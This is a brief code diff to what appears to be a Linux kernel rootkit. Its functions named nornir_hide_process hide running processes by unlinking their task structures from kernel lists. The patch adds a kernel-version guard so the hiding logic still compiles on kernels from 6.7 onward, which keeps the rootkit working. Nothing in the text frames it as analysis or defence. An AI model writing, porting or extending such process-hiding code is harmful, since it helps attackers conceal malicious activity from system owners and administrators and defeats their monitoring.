@@ -9,6 +9,7 @@
 #include <linux/list.h>
 #include <linux/idr.h>
 #include <linux/pid_namespace.h>
+#include <linux/version.h>
 
 void nornir_hide_process_pid(struct task_struct *task, struct pid *pid)
 {
@@ -46,6 +47,9 @@ void nornir_hide_process_task_struct(struct task_struct *task)
     list_del(&task->thread_node);
     INIT_LIST_HEAD(&task->thread_node);
 
+    /* removed in commit 8e1f385104ac */
+#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 7, 0)
     list_del(&task->thread_group);
     INIT_LIST_HEAD(&task->thread_group);
+#endif
 }
